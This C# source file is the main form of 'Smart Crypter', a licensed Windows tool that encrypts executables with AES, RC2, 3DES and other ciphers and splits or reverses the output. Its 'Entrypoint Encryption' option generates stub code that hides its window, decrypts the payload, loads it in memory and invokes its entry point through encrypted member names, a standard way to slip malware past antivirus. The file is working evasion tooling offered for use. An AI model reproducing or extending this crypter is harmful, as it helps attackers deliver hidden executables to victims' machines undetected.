//  Main.cs
//  Author: Jameel Nabbo
//  https://github.com/JameelNabbo
//  http://cyberboundaries.net
//  Dual licensed under either the terms of the BSD License, or alternatively
//  under the terms of the Apache License, Version 2.0, as specified below.
//

/*
 Copyright (c) 2016, Jameel Nabbo
 
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without
 modification, are permitted provided that the following conditions are met:
 
 * Redistributions of source code must retain the above copyright
 notice, this list of conditions and the following disclaimer.
 
 * Redistributions in binary form must reproduce the above copyright
 notice, this list of conditions and the following disclaimer in the
 documentation and/or other materials provided with the distribution.
 
 * Neither the name of the Zang Industries nor the names of its
 contributors may be used to endorse or promote products derived from
 this software without specific prior written permission.
 
 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
 TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

/*
 Copyright 2016 Jameel Nabbo
 
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at
 
 http://www.apache.org/licenses/LICENSE-2.0
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
*/

using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;

namespace Smart_Crypter
{
    public partial class Main : Form
    {

        bool size = false;

        public Main()
        {
            InitializeComponent();

        }


        private void recuperareIIButton5_Click(object sender, EventArgs e)
        {
            Sound();
            if (this.richTextBox1.Text == "")
            {
                MessageBox.Show("No text for split", "Split", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            else
            {
                FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
                FolderBrowserDialog folderBrowserDialog2 = folderBrowserDialog;
                if (folderBrowserDialog2.ShowDialog() == DialogResult.OK)
                {
                    string s = Interaction.InputBox("How many part you want to split?").ToString();
                    string text = this.richTextBox1.Text;
                    string s2 = text.Length.ToString();
                    int num = int.Parse(s2) / int.Parse(s);
                    int num2 = 1;
                    for (int i = 0; i <= int.Parse(s); i++)
                    {
                        string contents = Strings.Mid(text, num2, num);
                        File.WriteAllText(folderBrowserDialog2.SelectedPath + "/Part" + i.ToString() + ".txt", contents);
                        num2 += num;
                    }
                }
            }
        }

        private void recuperareIIButton6_Click(object sender, EventArgs e)
        {
            Sound();
            if (richTextBox1.Text == "")
            {
                MessageBox.Show("No text to copy", "Error");
            }
            else {
                Clipboard.SetText(richTextBox1.Text);
            }
        }

        private void recuperareIIButton7_Click(object sender, EventArgs e)
        {
            Sound();
            richTextBox1.Clear();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            Sound();
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "(*.exe) | *.exe";
            openFileDialog.ShowDialog();
            tbxSelect.Text = openFileDialog.FileName;
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            Sound();
            if (!size)
            {
                this.Size = new Size(854, 661);
                size = true;
            }
            else
            {
                this.Size = new Size(628, 661);
                size = false;
            }
        }

        private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            Sound();
            if (TextBox5.Text == "")
            {
                if (tbxSelect.Text == "" || TextBox2.Text == "")
                {
                    MessageBox.Show("Please select a file or write key", "Error");
                }
                else
                {
                    string base64 = Convert.ToBase64String(File.ReadAllBytes(tbxSelect.Text));
                    string select = ComboBox1.Text;
                    string all;
                    switch (select)
                    {
                        case "Base64":
                            MessageBox.Show("Don't need key");
                            richTextBox1.Text = Convert.ToBase64String(File.ReadAllBytes(tbxSelect.Text));
                            break;
                        case "RC2":
                            all = EncryptionProvider.RC2_Encrypt(base64, TextBox2.Text);
                            richTextBox1.Text = all;
                            break;
                        case "AES":
                            all = EncryptionProvider.AES_Encrypt(base64, TextBox2.Text);
                            richTextBox1.Text = all;
                            break;
                        case "Rijndael":
                            all = EncryptionProvider.Rijndaelcrypt(base64, TextBox2.Text);
                            richTextBox1.Text = all;
                            break;
                        case "3DES":
                            all = EncryptionProvider.TripleDes(base64, TextBox2.Text);
                            richTextBox1.Text = all;
                            break;
                        case "VernamII":
                            all = EncryptionProvider.VernamII(base64, TextBox2.Text);
                            richTextBox1.Text = all;
                            break;
                        case "Vigenere":
                            all = EncryptionProvider.Vigenere(base64, TextBox2.Text);
                            richTextBox1.Text = all;
                            break;
                    }
                }
            }
        }



        private void recuperareIIButton1_Click(object sender, EventArgs e)
        {
            Sound();
            richTextBox1.Text = richTextBox1.Text.Replace(TextBox3.Text, TextBox4.Text);
        }

        public static string ReverseString(string s)
        {
            char[] arr = s.ToCharArray();
            Array.Reverse(arr);
            return new string(arr);
        }

        private void Button4_Click(object sender, EventArgs e)
        {
            Sound();
            if (richTextBox1.Text == "")
            {
                MessageBox.Show("No text to reverse", "Error");
            }
            else
            {
                richTextBox1.Text = ReverseString(richTextBox1.Text);
            }
        }

        private void Button5_Click(object sender, EventArgs e)
        {
            Sound();
            richTextBox1.Text = Smart_Crypter.Properties.Resources.ReverseString;
        }

        private void ComboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            Sound();
            string select = ComboBox2.Text;
            switch (select)
            {

                case "RC2":
                    richTextBox1.Text = Smart_Crypter.Properties.Resources.RC2Decrypt;
                    break;
                case "AES":
                    richTextBox1.Text = Smart_Crypter.Properties.Resources.AESDecrypt;
                    break;
                case "Rijndael":
                    richTextBox1.Text = Smart_Crypter.Properties.Resources.RijndaelDecrypt;
                    break;
                case "3DES":
                    richTextBox1.Text = Smart_Crypter.Properties.Resources.TDesDecrypt;
                    break;
                case "VernamII":
                    richTextBox1.Text = Smart_Crypter.Properties.Resources.VernamDecrypt;
                    break;
                case "Vigenere":
                    richTextBox1.Text = Smart_Crypter.Properties.Resources.VigenereDecrypt;
                    break;
            }
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            Sound();
            MessageBox.Show("Cyber Boundaries - Jameel Nabbo", "About");
        }

        private void recuperareIIButton4_Click(object sender, EventArgs e)
        {
            Sound();
            if (TextBox5.Text == "" || TextBox2.Text == "")
            {
                MessageBox.Show("Please write text to encrypt or write key", "Error");
            }
            else {
                string select = ComboBox1.Text;
                switch (select)
                {
                    case "Base64":
                        byte[] bytes = Encoding.UTF8.GetBytes(TextBox5.Text);
                        string base64 = Convert.ToBase64String(bytes);
                        TextBox6.Text = base64;
                        break;
                    case "RC2":
                        TextBox6.Text = EncryptionProvider.RC2_Encrypt(TextBox5.Text, TextBox2.Text);
                        break;
                    case "AES":
                        TextBox6.Text = EncryptionProvider.AES_Encrypt(TextBox5.Text, TextBox2.Text);
                        break;
                    case "Rijndael":
                        TextBox6.Text = EncryptionProvider.Rijndaelcrypt(TextBox5.Text, TextBox2.Text);
                        break;
                    case "3DES":
                        TextBox6.Text = EncryptionProvider.TripleDes(TextBox5.Text, TextBox2.Text);
                        break;
                    case "VernamII":
                        TextBox6.Text = EncryptionProvider.VernamII(TextBox5.Text, TextBox2.Text);
                        break;
                    case "Vigenere":
                        TextBox6.Text = EncryptionProvider.Vigenere(TextBox5.Text, TextBox2.Text);
                        break;
                }
            }
        }

        private void Form1_Load_1(object sender, EventArgs e)
        {

            CenterToScreen();
            this.Size = new Size(628, 661);
            CheckBox1.Checked = true;
        }
        public void Sound()
        {
            if (CheckBox1.Checked == true)
            {
                SoundPlayer Sound = new SoundPlayer(Smart_Crypter.Properties.Resources.Clicking_Sounds);
                Sound.Play();
            }

        }

        private void ComboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            Sound();
            string select = ComboBox3.Text;
            if (tbxSelect.Text == "" || TextBox2.Text == "")
            {
                MessageBox.Show("Please select a file or write a key");
            }
            else
            {
                switch (select)
                {
                    case "Entrypoint Encryption":
                        string fun = "//using Microsoft.VisualBasic";
                        string base64 = Convert.ToBase64String(File.ReadAllBytes(tbxSelect.Text));
                        string z = "this.Hide();";
                        string z1 = "this.Visible = false;";
                        string all = EncryptionProvider.AES_Encrypt(base64, TextBox2.Text);
                        string z3 = "byte[] m2 = Convert.FromBase64String(AES_Decrypt(" + "all ," + "\"" + TextBox2.Text + "\"" + "));";
                        string z4 = "Object a1 = System.AppDomain.CurrentDomain.Load(m2);";
                        string z5 = EncryptionProvider.AES_Encrypt("EntryPoint", TextBox2.Text);
                        string z6 = "object a2 = Interaction.CallByName(a1, AES_Decrypt(" + "\"" + z5 + "\"" + "," + "\"" + TextBox2.Text + "\"), CallType.Get);";
                        string z7 = EncryptionProvider.AES_Encrypt("Invoke", TextBox2.Text);
                        string z8 = "object a3 = Interaction.CallByName(a2, AES_Decrypt(" + "\"" + z7 + "\"" + "," + "\"" + TextBox2.Text + "\"), CallType.Method, 0, null);";
                        richTextBox1.Text = (fun + "\n" + z + "\n" + z1 + "\n" + "String all =" + "\"" + all + "\";" + "\n" + z3 + "\n" + z4 + "\n" + z6 + "\n" + z8);
                        break;
                }
            }
        }

  
    }
}
